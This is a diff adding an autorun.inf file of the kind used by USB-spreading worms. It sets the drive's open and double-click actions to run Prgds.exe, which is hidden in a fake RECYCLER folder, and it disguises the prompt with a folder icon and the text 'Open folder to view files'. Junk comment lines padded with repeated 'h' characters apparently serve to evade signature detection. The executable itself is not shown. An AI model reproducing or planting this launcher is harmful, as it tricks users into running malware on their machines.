@@ -1,0 +1,12 @@
+[autorun]
+open=RECYCLER\S-51-9-25-3434476501-1644491938-601013333-1214\Prgds.exe
+;hhhhhhhhhhhhhymyus
+icon=%windir%\system32\SHELL32.dll,4
+;hhhhhhhhhhhhhhhhhxs
+action=Open folder to view files
+;hhhhhhhhhhhhhhhhhhhhhtrxsx
+shell\open=Open
+;hhhhhhhhhhhhhhhhhhhhhhhhhhhhujsxs
+shell\open\command=RECYCLER\S-51-9-25-3434476501-1644491938-601013333-1214\Prgds.exe
+;hhhhhhhhhhhhhhhhhhhhhusx
+shell\open\default=1
